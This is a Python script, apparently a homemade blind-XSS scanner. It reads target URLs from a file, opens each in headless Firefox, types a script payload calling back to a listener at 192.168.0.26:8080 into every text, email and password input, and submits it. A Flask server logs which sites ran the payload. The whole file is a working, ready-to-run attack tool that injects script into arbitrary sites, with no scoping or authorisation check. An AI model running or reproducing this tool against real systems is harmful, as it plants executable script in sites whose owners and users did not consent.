from flask import Flask, request
import threading
import time
import json
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service
import requests

# Flask App
app = Flask(__name__)

# Global mapping of index to URL
url_map = {}


CYAN = "\033[96m"
RED = "\033[31m"
GREEN = "\033[92m"
RESET = "\033[0m"
PURPLE = "\033[95m"


error = f"{RED}[!]{RESET}"

@app.route('/test', methods=['GET'])
def test_endpoint():
	index = request.args.get('index', '')

	if index and index.isdigit():
		index = int(index)
		url = url_map.get(index, "Unknown")
		print(f"{GREEN}[GOT]{RESET} Received XSS payload from {url}")
	return "Received"

def run_server():
	app.run(host='0.0.0.0', port=8080, ssl_context='adhoc')

def load_urls(file_path):
	with open(file_path, 'r') as f:
		urls = [line.strip() for line in f if line.strip()]
	return {i + 1: url for i, url in enumerate(urls)}

def is_url_reachable(url, timeout=3):
	try:
		response = requests.head(url, allow_redirects=True, timeout=timeout)
		return True
	except requests.RequestException:
		return False

def scan_urls(url_dict):
	geckodriver_path = "/usr/local/bin/geckodriver"
	firefox_binary_path = "/usr/bin/firefox"

	options = webdriver.FirefoxOptions()
	options.headless = True
	options.add_argument("--headless")
	options.binary_location = firefox_binary_path


	for index, url in url_dict.items():
		time.sleep(3)
		service = Service(geckodriver_path)
		driver = webdriver.Firefox(service=service, options=options)
		if is_url_reachable(url):
			print(f"{PURPLE}[+]{RESET} Scanning {url}")

			try:
				driver.get(url)
				xss_payload = f'''<script>fetch('https://192.168.0.26:8080/test?index={index}');</script>'''
				inputs = driver.find_elements(By.TAG_NAME, "input")
				print(f"[+] Found {len(inputs)} input(s)")
				for input_element in inputs:
					try:
						input_type = input_element.get_attribute("type") or "text"
						if input_type in ["text", "search", "email", "password", "url", "tel", "number"]:
							driver.execute_script("arguments[0].scrollIntoView(true);", input_element)
							input_element.clear()
							input_element.send_keys(xss_payload)
							input_element.send_keys(Keys.RETURN)
							print(f"[+] Injected into input")
					except Exception as e:
						print(f"{error} Error injecting into input")
			except Exception as e:
				print(f"{error} Error loading URL")
			finally:
				driver.quit()
		else:
			print(f"[!] {url} Is unreachable")


if __name__ == '__main__':
	# Load URLs from file
	url_map = load_urls("targets.txt")

	# Start the server
	server_thread = threading.Thread(target=run_server)
	server_thread.daemon = True
	server_thread.start()

	# Start scanning
	scan_urls(url_map)
